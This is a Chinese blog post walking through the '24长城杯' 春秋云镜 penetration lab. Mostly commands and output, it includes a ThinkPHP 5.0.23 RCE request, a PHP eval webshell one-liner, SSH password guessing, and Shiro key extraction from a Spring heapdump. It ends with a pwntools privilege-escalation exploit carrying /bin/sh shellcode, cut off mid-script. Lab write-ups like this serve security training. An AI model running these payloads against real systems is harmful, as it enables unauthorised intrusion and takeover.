@@ -1,0 +1,1822 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="24长城杯, q1n9&#39;s blog">
+    <meta name="description" content="24长城杯39.101.67.119
+flag01┌──(kali㉿kali)-[~/桌面/tools/tools/fscan_all_version]
+└─$ ./fscan -h 39.101.67.119
+
+   ___       ">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>24长城杯 | q1n9&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">q1n9&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">q1n9&#39;s blog</div>
+        <div class="logo-desc">
+            
+            welcome to my blog
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/lingqing777/lingqing777.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/lingqing777/lingqing777.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">24长城杯</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">
+                                <span class="chip bg-color">春秋云镜</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">渗透</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                网安
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2025-09-13
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2025-09-28
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    5.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    27 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="24长城杯"><a href="#24长城杯" class="headerlink" title="24长城杯"></a>24长城杯</h1><p>39.101.67.119</p>
+<h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~/桌面/tools/tools/fscan_all_version]
+└─$ ./fscan -h 39.101.67.119
+
+   ___                              _    
+  / _ \     ___  ___ _ __ __ _  ___| | __ 
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
+\____/     |___/\___|_|  \__,_|\___|_|\_\   
+                     fscan version: 1.8.4
+start infoscan
+39.101.67.119:80 open
+Open result.txt error, open result.txt: permission denied
+39.101.67.119:22 open
+Open result.txt error, open result.txt: permission denied
+39.101.67.119:8080 open
+Open result.txt error, open result.txt: permission denied
+[*] alive ports len is: 3
+start vulscan
+[*] WebTitle http://39.101.67.119      code:200 len:10887  title:""
+Open result.txt error, open result.txt: permission denied
+[*] WebTitle http://39.101.67.119:8080 code:200 len:1027   title:Login Form
+Open result.txt error, open result.txt: permission denied
+[+] PocScan http://39.101.67.119:8080 poc-yaml-thinkphp5023-method-rce poc1
+Open result.txt error, open result.txt: permission denied                                                                                                                           
+已完成 2/3 [-] ssh 39.101.67.119:22 root root123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 
+已完成 2/3 [-] ssh 39.101.67.119:22 root a123456. ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 
+已完成 2/3 [-] ssh 39.101.67.119:22 root Aa123123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 
+已完成 2/3 [-] ssh 39.101.67.119:22 admin pass123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 
+已完成 2/3 [-] ssh 39.101.67.119:22 admin P@ssw0rd! ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 
+已完成 2/3 [-] ssh 39.101.67.119:22 admin 1234567890 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 
+已完成 3/3
+[*] 扫描结束,耗时: 7m7.882255629s
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>先把<code>poc-yaml-thinkphp5023-method-rce poc1</code>弄了</p>
+<pre class="line-numbers language-none"><code class="language-none">POST /?s=captcha HTTP/1.1
+Host: 39.101.67.119:8080
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://node.hackhub.get-shell.com:52484/?s=captcha
+Accept-Encoding: gzip, deflate
+Accept-Language: zh,zh-CN;q=0.9
+Content-Length: 80
+
+_method=__construct&amp;filter%5B%5D=system&amp;method=get&amp;server%5BREQUEST_METHOD%5D=cat /f1ag01_UdEv.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/6ff7982025fab6c124a8b3d030ba9f54.png"></p>
+<p>写个马</p>
+<pre class="line-numbers language-none"><code class="language-none">echo '&lt;?php eval($_POST[cmd]); ?&gt;' &gt; she.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><p>上代理</p>
+<pre class="line-numbers language-none"><code class="language-none">./linux_x64_admin -c 39.101.67.119:7879 
+./linux_x64_agent -l 7879 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>扫内网</p>
+<pre class="line-numbers language-none"><code class="language-none">fconfig
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 172.28.23.17  netmask 255.255.0.0  broadcast 172.28.255.255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">172.28.23.17:80 open
+172.28.23.17:8080 open
+172.28.23.17:22 open
+[*] WebTitle http://172.28.23.17       code:200 len:10887  title:""
+[*] WebTitle http://172.28.23.17:8080  code:200 len:1027   title:Login Form
+[+] PocScan http://172.28.23.17:8080 poc-yaml-thinkphp5023-method-rce poc1
+172.28.23.26:21 open
+172.28.23.33:8080 open
+172.28.23.17:8080 open
+172.28.23.26:80 open
+172.28.23.26:22 open
+172.28.23.33:22 open
+172.28.23.17:80 open
+172.28.23.17:22 open
+[*] WebTitle http://172.28.23.26       code:200 len:13693  title:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413
+[*] WebTitle http://172.28.23.17:8080  code:200 len:1027   title:Login Form
+[*] WebTitle http://172.28.23.17       code:200 len:10887  title:""
+[*] WebTitle http://172.28.23.33:8080  code:302 len:0      title:None 跳转url: http://172.28.23.33:8080/login;jsessionid=B8CDDF596CB271A2BD891E51AF727386
+[*] WebTitle http://172.28.23.33:8080/login;jsessionid=B8CDDF596CB271A2BD891E51AF727386 code:200 len:3860   title:智联科技 ERP 后台登陆
+[+] ftp 172.28.23.26:21:anonymous 
+   [-&gt;]OASystem.zip
+[+] PocScan http://172.28.23.17:8080 poc-yaml-thinkphp5023-method-rce poc1
+[+] PocScan http://172.28.23.33:8080 poc-yaml-spring-actuator-heapdump-file 
+[+] PocScan http://172.28.23.33:8080 poc-yaml-springboot-env-unauth spring2
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>见<code>Hospital</code>的步骤heapdump+拿shiro</p>
+<pre class="line-numbers language-none"><code class="language-none">http://172.28.23.33:8080/actuator/heapdump
+java -jar .\JDumpSpider-1.1-SNAPSHOT-full.jar .\heapdump
+
+CookieRememberMeManager(ShiroKey)
+-------------
+algMode = GCM（注意）, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/cb379895cbec93dc4fca71dd6fcba10c.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">java -jar shiro_attack-4.7.0-SNAPSHOT-all.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>勾选GCM</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/6af4cb4e20dcb22cc1ce68122452ac3c.png"></p>
+<p>33（并没有什么作用）</p>
+<pre class="line-numbers language-none"><code class="language-none">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 172.28.23.33  netmask 255.255.0.0  broadcast 172.28.255.255
+        inet6 fe80::216:3eff:fe05:2c1a  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:16:3e:05:2c:1a  txqueuelen 1000  (Ethernet)
+        RX packets 233917  bytes 251273511 (251.2 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 76271  bytes 264579870 (264.5 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 172.22.10.16  netmask 255.255.255.0  broadcast 172.22.10.255
+        inet6 fe80::216:3eff:fe05:2c1b  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:16:3e:05:2c:1b  txqueuelen 1000  (Ethernet)
+        RX packets 5596  bytes 2725727 (2.7 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 4769  bytes 2335376 (2.3 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 8626  bytes 3298317 (3.2 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 8626  bytes 3298317 (3.2 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+-----------------------------------------------------------------------
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>打通后需要用pwn提权</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./HashNote'</span><span class="token punctuation">)</span>
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span>elf<span class="token punctuation">.</span>arch<span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+<span class="token comment"># p = process('./HashNote')</span>
+
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'172.28.23.33'</span><span class="token punctuation">,</span> <span class="token number">59696</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">send_command</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">add_entry</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    send_command<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Key: '</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Data: '</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">get_entry</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    send_command<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Key: '</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">update_entry</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    send_command<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Key: '</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Data: '</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">set_username</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    send_command<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'New username: '</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
+
+<span class="token comment"># Authenticate</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Username: '</span><span class="token punctuation">,</span> <span class="token string">b'123'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Password: '</span><span class="token punctuation">,</span> <span class="token string">b'freep@ssw0rd:3'</span><span class="token punctuation">)</span>
+
+<span class="token comment"># Add entries to setup the environment</span>
+add_entry<span class="token punctuation">(</span><span class="token string">b'aabP'</span><span class="token punctuation">,</span> <span class="token string">b'aaaaaaaa'</span><span class="token punctuation">)</span>
+add_entry<span class="token punctuation">(</span><span class="token string">b'aace'</span><span class="token punctuation">,</span> <span class="token string">b'C'</span> <span class="token operator">*</span> <span class="token number">0xc0</span><span class="token punctuation">)</span>
+
+<span class="token comment"># Shellcode to spawn a shell</span>
+sc <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">b'\x6a\x3b'</span><span class="token punctuation">,</span>                   <span class="token comment"># push   0x3b</span>
+    <span class="token string">b'\x58'</span><span class="token punctuation">,</span>                       <span class="token comment"># pop    rax</span>
+    <span class="token string">b'\x99'</span><span class="token punctuation">,</span>                       <span class="token comment"># cdq</span>
+    <span class="token string">b'\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68'</span><span class="token punctuation">,</span> <span class="token comment"># movabs rbx, 0x68732f6e69622f2f</span>
+    <span class="token string">b'\x53'</span><span class="token punctuation">,</span>                       <span class="token comment"># push   rbx</span>
+    <span class="token string">b'\x48\x89\xe7'</span><span class="token punctuation">,</span>               <span class="token comment"># mov    rdi, rsp</span>
+    <span class="token string">b'\x52'</span><span class="token punctuation">,</span>                       <span class="token comment"># push   rdx</span>
+    <span class="token string">b'\x57'</span><span class="token punctuation">,</span>                       <span class="token comment"># push   rdi</span>
+    <span class="token string">b'\x48\x89\xe6'</span><span class="token punctuation">,</span>               <span class="token comment"># mov    rsi, rsp</span>
+    <span class="token string">b'\x0f\x05'</span>                    <span class="token comment"># syscall</span>
+<span class="token punctuation">]</span>
+shellcode <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>sc<span class="token punctuation">)</span>
+username_addr <span class="token operator">=</span> <span class="token number">0x5dc980</span>
+fake_obj_addr <span class="token operator">=</span> username_addr <span class="token operator">+</span> <span class="token number">0x10</span>
+
+<span class="token keyword">def</span> <span class="token function">arbitrary_read</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>fake_obj_addr<span class="token punctuation">)</span>
+    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
+
+    fake_obj <span class="token operator">=</span> p64<span class="token punctuation">(</span>fake_obj_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+    fake_obj <span class="token operator">+=</span> <span class="token string">b'aahO'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
+    fake_obj <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'aaaaaaaa'</span>
+
+    payload <span class="token operator">+=</span> fake_obj
+    payload <span class="token operator">+=</span> shellcode
+    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
+    set_username<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    get_entry<span class="token punctuation">(</span><span class="token string">b'aahO'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">arbitrary_write</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>fake_obj_addr<span class="token punctuation">)</span>
+    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
+
+    fake_obj <span class="token operator">=</span> p64<span class="token punctuation">(</span>fake_obj_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+    fake_obj <span class="token operator">+=</span> <span class="token string">b'aahO'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
+    fake_obj <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'aaaaaaaa'</span>
+
+    payload <span class="token operator">+=</span> fake_obj
+    payload <span class="token operator">+=</span> shellcode
+    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
+    set_username<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
